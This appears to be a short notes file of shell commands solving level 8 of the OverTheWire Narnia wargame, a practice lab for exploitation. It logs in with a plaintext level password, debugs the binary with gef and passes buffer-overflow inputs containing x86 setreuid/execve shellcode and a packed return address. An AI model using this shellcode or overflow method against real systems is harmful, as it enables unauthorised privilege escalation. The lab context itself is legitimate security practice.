sftp -oPort=2226 narnia8@narnia.labs.overthewire.org
i1SQ81fkb8
get /narnia/narnia8
get /narnia/narnia8.c
exit

sshpass -p 'i1SQ81fkb8' ssh narnia8@narnia.labs.overthewire.org -p 2226
cd /narnia

gef ./narnia8

run $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'ABCDBBCDCBCDDBCDEBCDFBCDGBCDHBCD' * 1000)")
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffd358) + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

./narnia8 $(python3 -c "import sys, struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffffff) + b'A' * 24)")
./narnia8 $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

